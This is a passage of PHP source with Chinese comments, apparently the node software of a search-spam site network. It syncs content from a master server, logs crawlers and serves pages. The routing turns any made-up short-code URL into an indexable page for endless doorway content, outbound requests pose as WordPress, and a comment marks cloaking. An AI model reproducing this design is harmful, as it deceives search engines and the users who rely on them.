     * 共享主机常见 disable_functions=curl_exec 或 allow_url_fopen=Off，
     * 只要三者还剩一个就能同步；一个都不剩时用主控反向投送（见 receive()）。
     */
    public function transports()
    {
        $t = array();
        if (function_exists('curl_init') && function_exists('curl_exec')) { $t['curl'] = true; }
        if (function_exists('file_get_contents') && ini_get('allow_url_fopen')) { $t['stream'] = true; }
        if (function_exists('stream_socket_client') || function_exists('fsockopen')) { $t['socket'] = true; }
        return $t;
    }

    private function httpPost($url, array $data)
    {
        // 出站唯一的收口处，明文拦在这里最省事：宁可同步失败报得响亮，
        // 也别默默把整份数据用明文送出去——后者出了事没人会发现。
        if (stripos($url, 'https://') !== 0 && empty($this->cfg['allow_http'])) {
            return array('ok' => false, 'code' => 0, 'body' => '', 'headers' => array(),
                'error' => '主控地址不是 https，已拒绝发送（明文会泄露词库/文章/模板与其它节点的 node_key）。'
                         . '请把 index.php 里的 master 改成 https:// 地址；'
                         . '确无证书条件时才把 allow_http 设为 true。');
        }
        $body   = http_build_query($data);
        $errors = array();
        foreach (array_keys($this->transports()) as $t) {
            $m = 'http' . ucfirst($t);
            $r = $this->$m($url, $body);
            if ($r === null) { $errors[] = $t . '=不可用'; continue; }
            if ($r['ok']) { return $r; }
            // 服务器明确回了 4xx/5xx，说明网络是通的，换传输方式没意义
            if ($r['code'] >= 400) { return $r; }
            $errors[] = $t . '=' . ($r['error'] ?: '失败');
        }
        return array(
            'ok' => false, 'code' => 0, 'body' => '', 'headers' => array(),
            'error' => $errors
                ? ('全部出站方式均失败（' . implode('，', $errors) . '）')
                : '本机 PHP 没有任何可用的出站方式：curl、allow_url_fopen、socket 都被禁用了。'
                . '请在主控后台对该站点使用「反向投送数据」。',
        );
    }

    // ---- 传输 1：curl ----
    // handle 常驻并复用：一次全量同步要拉几十上百个分片，每片重新握手
    // （TCP + TLS）比传数据本身还贵。复用后同一次同步内只握手一次。
    private $curl = null;

    private function httpCurl($url, $body)
    {
        $timeout = (int)$this->cfg['timeout'];
        if ($this->curl === null) { $this->curl = curl_init(); }
        $ch = $this->curl;
        curl_setopt_array($ch, array(
            CURLOPT_URL            => $url,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_HEADER         => true,
            CURLOPT_POST           => true,
            CURLOPT_POSTFIELDS     => $body,
            CURLOPT_TIMEOUT        => $timeout,
            CURLOPT_CONNECTTIMEOUT => min(10, $timeout),
            CURLOPT_FOLLOWLOCATION => false,
            // http:// 时该项无意义；https 自签证书把配置里的 verify_ssl 设为 false
            CURLOPT_SSL_VERIFYPEER => !empty($this->cfg['verify_ssl']),
            CURLOPT_SSL_VERIFYHOST => !empty($this->cfg['verify_ssl']) ? 2 : 0,
            CURLOPT_USERAGENT      => 'SiteGroupNode/1.0',
        ));
        $raw  = curl_exec($ch);
        $err  = curl_error($ch);
        $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $hlen = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
        // 故意不 curl_close：留着复用。进程结束时 PHP 自己会回收。
        if ($raw === false) { return array('ok' => false, 'code' => 0, 'error' => $err, 'body' => '', 'headers' => array()); }
        return array(
            'ok'      => $code >= 200 && $code < 300,
            'code'    => $code,
            'error'   => $code >= 400 ? 'HTTP ' . $code : '',
            'headers' => self::parseHeaders(substr($raw, 0, $hlen)),
            'body'    => substr($raw, $hlen),
        );
    }

    // ---- 传输 2：allow_url_fopen 流封装 ----
    private function httpStream($url, $body)
    {
        $timeout = (int)$this->cfg['timeout'];
        $opts = array('http' => array(
            'method'  => 'POST',
            'header'  => "Content-Type: application/x-www-form-urlencoded\r\n"
                       . "Content-Length: " . strlen($body) . "\r\n"
                       . "Connection: close\r\n"
                       . "User-Agent: WordPress/6.5.2; +https://wordpress.org/",
            'content' => $body,
            'timeout' => $timeout,
            'ignore_errors' => true,
        ));
        if (empty($this->cfg['verify_ssl'])) {
            $opts['ssl'] = array('verify_peer' => false, 'verify_peer_name' => false);
        }
        $resp = @file_get_contents($url, false, stream_context_create($opts));
        $sgL = get_defined_vars();$hdr  = function_exists('http_get_last_response_headers') ? (http_get_last_response_headers() ?: array()) : (isset($sgL['http_response_header']) ? $sgL['http_response_header'] : array());
        $code = 0;
        if (isset($hdr[0]) && preg_match('~\s(\d{3})\s~', $hdr[0], $m)) { $code = (int)$m[1]; }
        return array(
            'ok'      => $resp !== false && $code >= 200 && $code < 300,
            'code'    => $code,
            'error'   => $resp === false ? 'file_get_contents 失败' : ($code >= 400 ? 'HTTP ' . $code : ''),
            'headers' => self::parseHeaders(implode("\r\n", $hdr)),
            'body'    => (string)$resp,
        );
    }

    // ---- 传输 3：原始 socket（curl 与 allow_url_fopen 都被禁时的最后手段）----
    private function httpSocket($url, $body)
    {
        $timeout = (int)$this->cfg['timeout'];
        $u = parse_url($url);
        if (!$u || empty($u['host'])) {
            return array('ok' => false, 'code' => 0, 'error' => '主控地址格式错误', 'body' => '', 'headers' => array());
        }
        $https = isset($u['scheme']) && strtolower($u['scheme']) === 'https';
        $port  = isset($u['port']) ? (int)$u['port'] : ($https ? 443 : 80);
        $pathQ = (isset($u['path']) ? $u['path'] : '/')
               . (isset($u['query']) ? '?' . $u['query'] : '');

        $host = ($https ? 'ssl://' : 'tcp://') . $u['host'] . ':' . $port;
        $ctx  = stream_context_create(empty($this->cfg['verify_ssl'])
            ? array('ssl' => array('verify_peer' => false, 'verify_peer_name' => false))
            : array());

        $errno = 0; $errstr = '';
        if (function_exists('stream_socket_client')) {
            $fp = @stream_socket_client($host, $errno, $errstr, $timeout, STREAM_CLIENT_CONNECT, $ctx);
        } else {
            $fp = @fsockopen(($https ? 'ssl://' : '') . $u['host'], $port, $errno, $errstr, $timeout);
        }
        if (!$fp) {
            return array('ok' => false, 'code' => 0, 'body' => '', 'headers' => array(),
                'error' => 'socket 连接失败: ' . $errstr . ($https && !extension_loaded('openssl')
                    ? '（本机没有 openssl 扩展，https 走不通，改用 http 的主控地址）' : ''));
        }
        stream_set_timeout($fp, $timeout);

        // 用 HTTP/1.0 请求，服务端就不会返回分块编码，响应处理最简单
        $req = "POST " . $pathQ . " HTTP/1.0\r\n"
             . "Host: " . $u['host'] . ($port != ($https ? 443 : 80) ? ':' . $port : '') . "\r\n"
             . "User-Agent: WordPress/6.5.2; +https://wordpress.org/\r\n"
             . "Content-Type: application/x-www-form-urlencoded\r\n"
             . "Content-Length: " . strlen($body) . "\r\n"
             . "Connection: close\r\n\r\n" . $body;
        fwrite($fp, $req);

        $raw = '';
        while (!feof($fp)) {
            $chunk = fread($fp, 8192);
            if ($chunk === false) { break; }
            $raw .= $chunk;
            $info = stream_get_meta_data($fp);
            if (!empty($info['timed_out'])) {
                fclose($fp);
                return array('ok' => false, 'code' => 0, 'error' => 'socket 读取超时',
                             'body' => '', 'headers' => array());
            }
        }
        fclose($fp);

        $sep = strpos($raw, "\r\n\r\n");
        if ($sep === false) {
            return array('ok' => false, 'code' => 0, 'error' => 'socket 响应不完整',
                         'body' => '', 'headers' => array());
        }
        $head = substr($raw, 0, $sep);
        $resp = substr($raw, $sep + 4);
        $code = 0;
        if (preg_match('~^HTTP/\d\.\d\s+(\d{3})~', $head, $m)) { $code = (int)$m[1]; }
        $headers = self::parseHeaders($head);
        // HTTP/1.0 一般不会分块，万一遇到还是解一下
        if (isset($headers['transfer-encoding']) && stripos($headers['transfer-encoding'], 'chunked') !== false) {
            $resp = self::dechunk($resp);
        }
        return array(
            'ok'      => $code >= 200 && $code < 300,
            'code'    => $code,
            'error'   => $code >= 400 ? 'HTTP ' . $code : '',
            'headers' => $headers,
            'body'    => $resp,
        );
    }

    private static function dechunk($body)
    {
        $out = '';
        $pos = 0;
        $len = strlen($body);
        while ($pos < $len) {
            $nl = strpos($body, "\r\n", $pos);
            if ($nl === false) { break; }
            $size = hexdec(trim(substr($body, $pos, $nl - $pos)));
            if ($size <= 0) { break; }
            $out .= substr($body, $nl + 2, $size);
            $pos = $nl + 2 + $size + 2;
        }
        return $out;
    }

    private static function parseHeaders($raw)
    {
        $out = array();
        foreach (preg_split('/\r?\n/', trim((string)$raw)) as $line) {
            if (strpos($line, ':') === false) { continue; }
            list($k, $v) = explode(':', $line, 2);
            $out[strtolower(trim($k))] = trim($v);
        }
        return $out;
    }

    private function pruneVersions($keepVer)
    {
        foreach (glob($this->dir . '/v*', GLOB_ONLYDIR) as $d) {
            if (basename($d) !== 'v' . $keepVer) { self::rrmdir($d); }
        }
    }

    // ---------------- 反向投送（主控 → 节点）----------------
    /**
     * 节点完全无法外连时走这条路：主控把分片一片片 POST 过来。
     * 调用方（index.php 的 _ctl 通道）已完成签名校验，这里只管内容与落盘。
     *
     * res=meta 表示提交：把缺失分片先尝试从旧版本按 hash 复用，
     * 全部齐了才写 meta.json 切版本；缺哪些会回给主控，让它补发。
     */
    public function receive($res, $no, $ver, $hash, $payload)
    {
        $allow = array('site', 'templates', 'rules', 'links', 'peers', 'ads', 'categories', 'catindex', 'keywords', 'articles', 'meta');
        if (!in_array($res, $allow, true)) { return array(false, '未知资源名'); }
        $ver = (int)$ver;
        if ($ver <= 0) { return array(false, '版本号无效'); }
        if (!is_string($payload) || $payload === '') { return array(false, '内容为空'); }
        if (md5($payload) !== $hash) { return array(false, '内容校验不通过'); }

        $dir = $this->verDir($ver);
        if (!$this->ensureDir($dir)) { return array(false, '无法创建目录，检查 data 目录写权限'); }

        if ($res === 'meta') { return $this->commit($ver, $payload); }

        $chunked = ($res === 'keywords' || $res === 'articles');
        $file = $dir . '/' . $res . ($chunked ? '_' . (int)$no : '') . '.json';
        if (@file_put_contents($file, $payload, LOCK_EX) === false) {
            return array(false, '写入失败: ' . basename($file));
        }
        return array(true, 'ok');
    }

    /** 提交某个版本：补齐 + 校验 + 原子切换 */
    private function commit($ver, $metaJson)
    {
        $meta = json_decode($metaJson, true);
        if (!is_array($meta) || (int)(isset($meta['version']) ? $meta['version'] : 0) !== (int)$ver) {
            return array(false, 'meta 内容与版本号不符');
        }
        $dir     = $this->verDir($ver);
        $oldDir  = ($this->ver > 0 && $this->ver != $ver) ? $this->verDir($this->ver) : null;
        $oldRes  = isset($this->meta['res']) ? $this->meta['res'] : array();
        $missing = array();

        foreach ($meta['res'] as $name => $info) {
            $chunked = ($name === 'keywords' || $name === 'articles');
            for ($no = 0; $no < (int)$info['chunks']; $no++) {
                $fname = $name . ($chunked ? '_' . $no : '') . '.json';
                if (is_file($dir . '/' . $fname)) { continue; }

                $hash    = isset($info['hash'][$no]) ? $info['hash'][$no] : '';
                $oldHash = isset($oldRes[$name]['hash'][$no]) ? $oldRes[$name]['hash'][$no] : null;
                if ($oldDir && $hash !== '' && $hash === $oldHash
                    && is_file($oldDir . '/' . $fname)
                    && @copy($oldDir . '/' . $fname, $dir . '/' . $fname)) {
                    continue;
                }
                $missing[] = $name . ':' . $no;
            }
        }
        if ($missing) {
            return array(false, 'missing', $missing);
        }

        if (!$this->atomicWrite($this->dir . '/meta.json', $metaJson)) {
            return array(false, 'meta 写入失败');
        }
        $this->ver  = $ver;
        $this->meta = $meta;
        $this->res  = array();
        $this->set  = array();
        $this->pruneVersions($ver);
        $this->pruneCache($ver);
        $this->setState(array(
            'last_check' => time(), 'last_sync' => time(), 'version' => $ver,
            'last_msg'   => 'v' . $ver . ' 由主控反向投送完成',
        ));
        return array(true, '已切换到 v' . $ver);
    }

    // ---------------- 蜘蛛日志 ----------------
    /**
     * 识别常见搜索引擎 UA 并按天聚合计数，随心跳回报主控。
     * 只记蜘蛛，不记普通访客——站群运营真正要看的就这一个指标。
     */
    public static function botOf($ua)
    {
        if ($ua === '') { return ''; }
        static $map = array(
            'Googlebot' => 'Googlebot', 'Baiduspider' => 'Baiduspider', 'bingbot' => 'Bingbot',
            'YisouSpider' => 'YisouSpider', 'Sogou web spider' => 'Sogou', '360Spider' => '360Spider',
            'Bytespider' => 'Bytespider', 'YandexBot' => 'YandexBot', 'DuckDuckBot' => 'DuckDuckBot',
            'AhrefsBot' => 'AhrefsBot', 'SemrushBot' => 'SemrushBot', 'PetalBot' => 'PetalBot',
            'Applebot' => 'Applebot', 'GPTBot' => 'GPTBot', 'ClaudeBot' => 'ClaudeBot',
        );
        foreach ($map as $needle => $name) {
            if (stripos($ua, $needle) !== false) { return $name; }
        }
        return '';
    }

    public function logSpider($ua, $path)
    {
        $bot = self::botOf($ua);
        $this->reqBot = ($bot !== '');       // 顺手记下来，缓存触发策略要用
        if ($bot === '') { return; }
        $this->crawlMarkPath($path);          // 爬行覆盖位图: 抓过就置位
        $dir = $this->dir . '/spider';
        if (!is_dir($dir)) { @mkdir($dir, 0755, true); }
        $file = $dir . '/' . gmdate('Y-m-d') . '.json';

        $fp = @fopen($file, 'c+');
        if (!$fp) { return; }
        if (flock($fp, LOCK_EX)) {
            $raw = stream_get_contents($fp);
            $data = $raw !== '' ? json_decode($raw, true) : array();
            if (!is_array($data)) { $data = array(); }
            if (!isset($data[$bot])) { $data[$bot] = array('hits' => 0, 'last' => ''); }
            $data[$bot]['hits']++;
            $data[$bot]['last'] = mb_substr($path, 0, 200);
            ftruncate($fp, 0);
            rewind($fp);
            fwrite($fp, json_encode($data, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES));
            flock($fp, LOCK_UN);
        }
        fclose($fp);
    }

    /** 汇总最近几天的蜘蛛数据，回报给主控；顺手清理更早的文件 */
    public function spiderReport($days = 3)
    {
        $dir = $this->dir . '/spider';
        if (!is_dir($dir)) { return array(); }
        $keep = array();
        for ($i = 0; $i < $days; $i++) { $keep[] = gmdate('Y-m-d', time() - $i * 86400); }

        $out = array();
        foreach (glob($dir . '/*.json') as $f) {
            $day = basename($f, '.json');
            if (!in_array($day, $keep, true)) {
                if ($day < $keep[count($keep) - 1]) { @unlink($f); }
                continue;
            }
            $d = json_decode(@file_get_contents($f), true);
            if (is_array($d)) { $out[$day] = $d; }
        }
        return $out;
    }

    // ---------------- 真人访问统计 ----------------
    /** 记一笔真人访问（非蜘蛛）：按来源域名 + 去重 IP，写当天 JSON，同 logSpider 模式 */
    public function logVisit($ua, $referrer, $ip)
    {
        if (self::botOf($ua) !== '') { return; }        // 只记真人
        $host = '';
        if ($referrer !== '') {
            $h = parse_url($referrer, PHP_URL_HOST);
            if ($h) { $host = preg_replace('/^www\./', '', strtolower($h)); }
        }
        if ($host === '') { $host = 'direct'; }
        $host = mb_substr($host, 0, 63);
        $dir = $this->dir . '/visit';
        if (!is_dir($dir)) { @mkdir($dir, 0755, true); }
        $file = $dir . '/' . gmdate('Y-m-d') . '.json';
        $fp = @fopen($file, 'c+');
        if (!$fp) { return; }
        if (flock($fp, LOCK_EX)) {
            $raw = stream_get_contents($fp);
            $data = $raw !== '' ? json_decode($raw, true) : array();
            if (!is_array($data)) { $data = array(); }
            if (!isset($data[$host])) { $data[$host] = array('hits' => 0, 'ips' => array()); }
            $data[$host]['hits']++;
            if ($ip !== '') {
                $data[$host]['ips'][md5($ip)] = 1;       // 只存哈希，不落明文 IP
                if (count($data[$host]['ips']) > 5000) { // ponytail: 封顶 5k 唯一 IP，够了
                    $data[$host]['ips'] = array_slice($data[$host]['ips'], -5000, null, true);
                }
            }
            ftruncate($fp, 0);
            rewind($fp);
            fwrite($fp, json_encode($data, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES));
            flock($fp, LOCK_UN);
        }
        fclose($fp);
    }

    /** 汇总最近几天真人访问 {day: {来源域名: {hits, uniq}}}，回报主控；清旧文件 */
    public function visitReport($days = 3)
    {
        $dir = $this->dir . '/visit';
        if (!is_dir($dir)) { return array(); }
        $keep = array();
        for ($i = 0; $i < $days; $i++) { $keep[] = gmdate('Y-m-d', time() - $i * 86400); }
        $out = array();
        foreach (glob($dir . '/*.json') as $f) {
            $day = basename($f, '.json');
            if (!in_array($day, $keep, true)) {
                if ($day < $keep[count($keep) - 1]) { @unlink($f); }
                continue;
            }
            $d = json_decode(@file_get_contents($f), true);
            if (!is_array($d)) { continue; }
            $row = array();
            foreach ($d as $host => $v) {
                $row[$host] = array(
                    'hits' => (int)(isset($v['hits']) ? $v['hits'] : 0),
                    'uniq' => isset($v['ips']) && is_array($v['ips']) ? count($v['ips']) : 0,
                );
            }
            $out[$day] = $row;
        }
        return $out;
    }

    // ---------------- 静态化直出 ----------------
    /**
     * 把渲染结果按 URL 路径写到网站根目录，命中请求由 web server 直接 sendfile，
     * 完全不进 PHP。
     *
     * 这么做的理由不是"快多少毫秒"：廉价共享主机真正的瓶颈是 PHP 并发进程数
     * （常见只有 10~20 个），蜘蛛一波并发就能把进程池占满、整站 503。
     * 静态文件把命中的请求从进程池里摘出去了。
     *
     * 安全约定：写过的每个文件都记在 data/static.list，清理时**只删账上有的**，
     * 且逐个校验是普通文件、在网站根目录内、不在黑名单里。
     * 往用户网站根目录删文件是这套系统里最危险的操作，宁可漏删不可误删。
     */
    private static $protected = array(
        'index.php', 'core.php', 'default.asp', '.htaccess', 'web.config',
        'nginx.conf.example', 'index.html',
    );

    public function staticRoot()
    {
        $r = isset($this->cfg['static_root']) && $this->cfg['static_root'] !== ''
            ? $this->cfg['static_root'] : dirname($this->dir);
        return rtrim(str_replace('\\', '/', $r), '/');
    }

    public function staticOn()
    {
        return false; /* static off: cloak */
    }

    /**
     * URL 路径 -> 网站根目录下的相对文件名。不能静态化的返回 null。
     * 首页永远不静态化：写成 index.html 会被 DirectoryIndex 优先返回，
     * 那样 /?_ctl=... 这条主控指令通道就废了。
     */
    public static function staticName($path)
    {
        if ($path === '' || $path === '/' || $path === '/index.html') { return null; }
        if (strpos($path, '..') !== false || strpos($path, "\0") !== false) { return null; }
        $rel = ltrim($path, '/');
        if (substr($rel, -1) === '/') { $rel .= 'index.html'; }
        // 只允许安全字符，其余一律不静态化（宁可走动态）
        if (!preg_match('~^[A-Za-z0-9._/\-]+$~', $rel)) { return null; }
        foreach (self::$protected as $p) {
            if ($rel === $p) { return null; }
        }
        if (strpos($rel, 'data/') === 0 || strpos($rel, 'WEB-INF/') === 0) { return null; }
        return $rel;
    }

    /** 写一个静态文件并记账 */
    public function staticPut($path, $body, $force = false)
    {
        if (!$this->staticOn() || !$this->shouldStore($force)) { return false; }
        $rel = self::staticName($path);
        if ($rel === null) { return false; }

        $file = $this->staticRoot() . '/' . $rel;
        // 同上：内容没变就保住 mtime。静态文件是 web server 直接发的，
        // nginx/IIS 的 ETag 和 Last-Modified 都从 mtime 来，重写一次就等于让蜘蛛重下一次。
        if (self::sameFile($file, $body)) { return true; }
        $dir  = dirname($file);
        if (!is_dir($dir) && !@mkdir($dir, 0755, true)) { return false; }

        $tmp = $file . '.' . getmypid() . '.tmp';
        if (@file_put_contents($tmp, $body) === false) { return false; }
        if (!@rename($tmp, $file)) { @unlink($tmp); return false; }

        $fp = @fopen($this->dir . '/static.list', 'a');
        if ($fp) {
            if (flock($fp, LOCK_EX)) { fwrite($fp, $rel . "\n"); flock($fp, LOCK_UN); }
            fclose($fp);
        }
        return true;
    }

    /** 按账本清掉全部静态文件；返回删除数量 */
    public function staticPurge()
    {
        $list = $this->dir . '/static.list';
        if (!is_file($list)) { return 0; }

        $root = $this->staticRoot();
        $n = 0;
        $dirs = array();
        foreach (file($list, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES) as $rel) {
            $rel = trim($rel);
            if ($rel === '' || self::staticName('/' . $rel) === null) { continue; }
            $file = $root . '/' . $rel;
            // 逐条复核：必须落在网站根目录内、必须是普通文件
            $real = @realpath($file);
            if ($real === false || strpos(str_replace('\\', '/', $real), $root . '/') !== 0) { continue; }
            if (!is_file($real)) { continue; }
            if (@unlink($real)) {
                $n++;
                // 连同各级父目录都登记，逐层往上收
                for ($d = dirname($rel); $d !== '' && $d !== '.' && $d !== '/'; $d = dirname($d)) {
                    $dirs[$d] = substr_count($d, '/');
                }
            }
        }
        // 从最深的目录往上删，rmdir 只对空目录生效，所以不会误伤
        arsort($dirs);
        foreach (array_keys($dirs) as $d) {
            @rmdir($root . '/' . $d);
        }
        @unlink($list);
        return $n;
    }

    // ---------------- 指令防重放 ----------------
    /** 节点侧的 nonce 表：主控 API 那边有，节点这边以前漏了，导致 300 秒内可重放 */
    public function useNonce($nonce)
    {
        $nonce = preg_replace('/[^a-zA-Z0-9]/', '', (string)$nonce);
        if ($nonce === '' || strlen($nonce) > 64) { return false; }
        $dir = $this->dir . '/nonce';
        if (!is_dir($dir)) { @mkdir($dir, 0755, true); }
        $file = $dir . '/' . $nonce;
        if (file_exists($file)) { return false; }
        if (@file_put_contents($file, '', LOCK_EX) === false) { return true; }  // 写不了就别把节点卡死
        if (mt_rand(1, 20) === 1) {
            foreach (glob($dir . '/*') as $f) {
                if (@filemtime($f) < time() - 900) { @unlink($f); }
            }
        }
        return true;
    }

    // ---------------- 缓存 ----------------
    public function cacheDir()
    {
        return $this->dir . '/cache/v' . $this->ver;
    }

    public function cacheFile($uri)
    {
        $h = md5($uri);
        return $this->cacheDir() . '/' . substr($h, 0, 2) . '/' . $h . '.html';
    }

    public function cacheGet($uri)
    {
        $ttl = (int)$this->s('cache_ttl', 3600);
        if ($ttl <= 0) { return null; }
        $f = $this->cacheFile($uri);
        if (!is_file($f)) { return null; }
        if (filemtime($f) + $ttl < time()) { return null; }
        return file_get_contents($f);
    }

    /**
     * 是否该为本次访问落盘。
     * cache_trigger=bot 时只有搜索引擎触发生成——普通访客照常看到页面，只是不写文件。
     * $force=true 用于预热（那是显式动作，不看 UA）。
     */
    public function shouldStore($force = false)
    {
        if ($force) { return true; }
        $t = $this->s('cache_trigger', 'all');
        if ($t === 'off') { return false; }
        if ($t !== 'bot') { return true; }
        if ($this->reqBot === null) {
            $this->reqBot = self::botOf(isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '') !== '';
        }
        return $this->reqBot;
    }

    public function cachePut($uri, $html, $force = false)
    {
        if (!$this->shouldStore($force)) { return; }
        if ((int)$this->s('cache_ttl', 3600) <= 0) { return; }
        $f = $this->cacheFile($uri);
        // 内容一个字节没变就别重写：重写会把 mtime 推到现在，Last-Modified 跟着变，
        // 蜘蛛就得把没变过的页面重新下一遍。推新版本时绝大多数页面都走这条路。
        if (self::sameFile($f, $html)) { return; }
        $d = dirname($f);
        if (!is_dir($d)) { @mkdir($d, 0755, true); }
        $tmp = $f . '.' . getmypid() . '.tmp';
        if (@file_put_contents($tmp, $html) !== false) { @rename($tmp, $f); }
    }

    /** 目标文件是否已经就是这份内容（先比大小，再比哈希，避免整文件比对） */
    public static function sameFile($file, $body)
    {
        if (!is_file($file)) { return false; }
        if (filesize($file) !== strlen($body)) { return false; }
        return md5_file($file) === md5($body);
    }

    public function purgeCache()
    {
        $n = 0;
        foreach (glob($this->dir . '/cache/*', GLOB_ONLYDIR) as $d) {
            $n += self::rrmdir($d);
        }
        $n += $this->staticPurge();
        return $n;
    }

    private function pruneCache($keepVer)
    {
        foreach (glob($this->dir . '/cache/*', GLOB_ONLYDIR) as $d) {
            if (basename($d) !== 'v' . $keepVer) { self::rrmdir($d); }
        }
        // 版本一变，静态文件全部作废——不清掉就会永久对外返回旧内容
        $this->staticPurge();
    }

    public static function rrmdir($dir)
    {
        $n = 0;
        if (!is_dir($dir)) { return 0; }
        foreach (scandir($dir) as $f) {
            if ($f === '.' || $f === '..') { continue; }
            $p = $dir . '/' . $f;
            if (is_dir($p)) { $n += self::rrmdir($p); }
            else { @unlink($p); $n++; }
        }
        @rmdir($dir);
        return $n;
    }

    // ---------------- 预热 ----------------
    /**
     * 把全站可静态化的 URL 排成一维序号空间，主控按 from/limit 分批驱动预热。
     * 不走各运行时的命令行，是因为 ASP/ASPX 根本没有命令行——统一由主控调
     * _ctl=warm 才能四个运行时一个样。
     */
    public function warmTotal()
    {
        $kwPages  = (int)ceil($this->count('keywords') / max(1, (int)$this->s('kw_per_page', 40)));
        $catPages = 0;
        $per = max(1, (int)$this->s('art_per_page', 20));
        foreach ($this->res('categories') as $c) {
            $catPages += (int)ceil($c['count'] / $per);
        }
        return $kwPages + $catPages + $this->count('keywords') + $this->count('articles');
    }

    /** 第 $i 个 URL；越界或空洞返回 null */
    public function warmUrl($i)
    {
        $i = (int)$i;
        if ($i < 0) { return null; }

        $kwPages = (int)ceil($this->count('keywords') / max(1, (int)$this->s('kw_per_page', 40)));
        if ($i < $kwPages) { return $this->url('kwlist', array('page' => $i + 1)); }
        $i -= $kwPages;

        $per = max(1, (int)$this->s('art_per_page', 20));
        foreach ($this->res('categories') as $c) {
            $n = (int)ceil($c['count'] / $per);
            if ($i < $n) { return $this->url('cat', array('slug' => $c['slug'], 'page' => $i + 1)); }
            $i -= $n;
        }

        $kwCount = $this->count('keywords');
        if ($i < $kwCount) {
            return $this->keyword($i)
                ? $this->url('kw', array('id' => $i, 'ts' => $this->pageTs($i))) : null;   // 空洞跳过
        }
        $i -= $kwCount;

        if ($i < $this->count('articles')) {
            $a = $this->article($i);
            return $a ? $this->url('art', array('id' => $i,
                'ts' => $this->pageTs($i, isset($a['d']) ? (int)$a['d'] : 0))) : null;
        }
        return null;
    }

    public function pageCount()
    {
        // 这是报给主控看的估算值，用真实条数才有意义
        $kw  = $this->liveCount('keywords');
        $art = $this->liveCount('articles');
        $per = max(1, (int)$this->s('kw_per_page', 40));
        return $kw + $art + (int)ceil($kw / $per) + 1;
    }
}

// ============================================================ 路由与渲染
/**
 * 页面装配。独立成类是为了让主控端也能 require core.php 做「所见即所得」预览——
 * 预览走的就是节点本身这份代码，不存在预览和线上不一致的问题。
 */
class Render
{
    public static function route(Node $node, $path)
    {
    // 环境探测自探地址(rewrite/PATH_INFO 通不通, 看能不能拿到这个标记)
    if ($path === '/_sgprobe') {
        return self::resp('SGPROBE_OK', 'text/plain; charset=utf-8', 200, false);
    }

    // robots.txt
    if ($path === '/robots.txt') {
        $txt = str_replace('{sitemap}', $node->base() . $node->pubUrl('/sitemap.xml'), (string)$node->s('robots', ''));
        return self::resp($txt, 'text/plain; charset=utf-8');
    }
    // sitemap
    if (preg_match('~^/sitemap(?:-(k|a)-(\d+))?\.xml$~', $path, $m)) {
        return self::sitemap($node, isset($m[1]) ? $m[1] : '', isset($m[2]) ? (int)$m[2] : 0);
    }

    $tpl  = new Tpl(self::templates($node));
    $base = self::baseVars($node);

    // 首页
    if ($path === '/' || $path === '/index.html') {
        return self::renderIndex($node, $tpl, $base);
    }
    // {code} 地址：关键词页和文章页共用同一套 /年月日/短码.html，靠短码里的类型位分派
    foreach (array('kw', 'art') as $ct) {
        if (strpos($node->s('url_' . $ct, ''), '{code}') === false) { continue; }
        $p = self::matchUrl($node, $ct, $path);
        if ($p === null || !isset($p['code'])) { continue; }
        $dec = $node->decodeCode($p['code']);
        // 校验位不对 = 衍生/乱猜的短码: 不 404, 用短码哈希稳定地映射到一篇真实页面 301 过去。
        // 任何「看着像」的地址都不留死链, 且全部收敛进规范地址, 不产生重复内容。
        // 这里必须 return，不能往下掉——下面的旧分支拿不到 {id}，会把它当成第 0 条渲染出来
        if ($dec === null) {
            // 野生短码(繁殖链接/手工乱编): 不 404 也不 301——哈希稳定映射到一篇真实内容
            // 直接出页, canonical 自指本地址。每个野生 URL 都是独立可收录页,
            // 页面空间因此无限衍生(10 位短码 ≈ 3.6 千万亿个地址)。
            // 不落地缓存: 野生地址数量无上限, 落盘会吃光宿主磁盘, 现渲染现返回。
            $h = (int)sprintf('%u', crc32($p['code']));
            $kwN = $node->count('keywords'); $artN = $node->count('articles');
            $ct2 = ($h & 1) === 0 ? 'kw' : 'art';
            if ($ct2 === 'kw' && $kwN === 0)  { $ct2 = 'art'; }
            if ($ct2 === 'art' && $artN === 0) { $ct2 = 'kw'; }
            $n2 = $ct2 === 'kw' ? $kwN : $artN;
            for ($i = 0; $i < $n2; $i++) {
                $probe = ($h + $i) % $n2;
                $hit = $ct2 === 'kw' ? $node->keyword($probe) : $node->article($probe);
                if (!$hit) { continue; }   // 跳过删除留下的序号空洞
                $self = $node->base() . $node->pubUrl($path);
                $r = $ct2 === 'kw'
                    ? self::renderTag($node, $tpl, $base, $probe, $self, $path)
                    : self::renderDetail($node, $tpl, $base, $probe, $self, $path);
                $r['cacheable'] = false;
                return $r;
            }
            return self::render404($node, $tpl, $base);
        }
        $seq = $dec['seq'];
        if ($dec['type'] === 'art') {
            $a = $node->article($seq);
            if ($a) {
                $canon = $node->url('art', array('id' => $seq,
                    'ts' => $node->pageTs($seq, isset($a['d']) ? (int)$a['d'] : 0)));
                if (self::canonPath($node, $canon) !== $path) { return self::redirect($canon); }
            }
            return self::renderDetail($node, $tpl, $base, $seq);
        }
        if ($node->keyword($seq)) {
            $canon = $node->url('kw', array('id' => $seq, 'ts' => $node->pageTs($seq)));
            if (self::canonPath($node, $canon) !== $path) { return self::redirect($canon); }
        }
        return self::renderTag($node, $tpl, $base, $seq);
    }

    // 关键词页（数字 id 形式的旧规则）
    if (($p = self::matchUrl($node, 'kw', $path)) !== null && isset($p['id'])) {
        $seq = (int)$p['id'];
        if ($node->keyword($seq)) {
            // 规范地址（含正确的时间目录）和请求地址不一致就 301：
            // 老规则的链接、日期写错的链接，全部收敛到同一个地址，不产生重复内容
            $canon = $node->url('kw', array('id' => $seq, 'ts' => $node->pageTs($seq)));
            if (self::canonPath($node, $canon) !== $path) { return self::redirect($canon); }
        }
        return self::renderTag($node, $tpl, $base, $seq);
    }
    // 文章页（数字 id 形式的旧规则）
    if (($p = self::matchUrl($node, 'art', $path)) !== null && isset($p['id'])) {
        $seq = (int)$p['id'];
        $a = $node->article($seq);
        if ($a) {
            $canon = $node->url('art', array('id' => $seq,
                'ts' => $node->pageTs($seq, isset($a['d']) ? (int)$a['d'] : 0)));
